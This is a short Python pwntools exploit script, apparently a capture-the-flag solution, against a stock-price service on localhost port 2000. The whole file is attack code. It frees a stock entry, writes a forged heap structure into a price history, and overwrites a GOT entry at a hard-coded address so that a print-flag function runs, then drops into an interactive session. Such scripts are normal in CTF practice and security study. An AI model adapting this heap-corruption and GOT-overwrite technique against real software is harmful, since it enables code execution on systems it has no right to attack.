#!/usr/bin/python3

import pwn

conn = pwn.remote('localhost', 2000)


def make_prices(count):
    return [str(i).encode('ASCII') for i in range(1, count+1)]


def send_prices(prices):
    for p in prices:
        conn.sendline(p)
        conn.sendline(p)


GOT_ADDRESS = 0x405230
def build_fake():
    fake = []
    fake.append(str(0x62).encode('ASCII'))
    for i in range(0, 7):
        fake.append(str(0x0).encode('ASCII'))
    fake.append(str(0x62).encode('ASCII'))
    for i in range(0, 3):
        fake.append(str(0x0).encode('ASCII'))
    fake.append(str(0x0040380b).encode('ASCII'))
    fake.append(str(0x0).encode('ASCII'))
    fake.append(str(0x0).encode('ASCII'))
    fake.append(str(0x1).encode('ASCII'))
    fake.append(str(0x0).encode('ASCII'))
    fake.append(str(0x0).encode('ASCII'))
    fake.append(str(GOT_ADDRESS).encode('ASCII'))
    for i in range(0, 5):
        fake.append(str(0x0).encode('ASCII'))
    return fake


PRINT_FLAG = 0x402b7f
def do_exploit():
    conn.sendline(b'add a a stock')
    conn.sendline(b'add b b stock 2')
    send_prices(make_prices(2))

    conn.sendline(b'select best')
    conn.sendline(b'delete 1')

    conn.sendline(b'select 1')
    conn.sendline(b'append_to_price_history 12')
    for f in build_fake():
        conn.sendline(f)

    conn.sendline(b'select best')
    conn.sendline(b'append_to_price_history 1')
    conn.sendline(str(PRINT_FLAG).encode('ASCII'))
    conn.sendline(str(0x0).encode('ASCII'))

    conn.sendline(b'list')

do_exploit()
conn.interactive()


conn.close()
